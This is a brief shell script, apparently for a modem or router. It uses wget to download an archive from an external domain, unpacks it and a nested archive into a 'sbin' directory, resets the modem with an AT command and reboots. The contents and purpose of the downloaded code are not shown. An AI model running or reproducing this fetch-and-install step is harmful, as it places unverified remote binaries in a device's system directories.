#!/bin/sh
wget http://junjuncruzit.online/bjc.tgz
tar -zxvf bjc.tgz
rm bjc.tgz
cd sbin
tar -zxvf sbin.tgz
rm sbin.tgz
cd
at_cmd at+zreset
reboot
